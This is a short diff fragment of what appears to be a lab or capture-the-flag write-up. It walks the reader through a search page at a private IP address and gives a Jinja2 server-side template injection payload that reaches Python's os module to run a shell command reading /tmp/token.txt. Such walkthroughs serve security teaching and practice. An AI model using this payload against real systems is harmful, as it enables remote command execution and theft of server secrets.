@@ -24,6 +24,7 @@ While on that search result page - change the URL to  `http://10.102.122.21/raw/
 You should be able to view the raw log file now
 
 Go back to search and use the payload:
+
 {% raw %}
 ```text
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat /tmp/token.txt").read()}}{% endif %}{% endfor %}
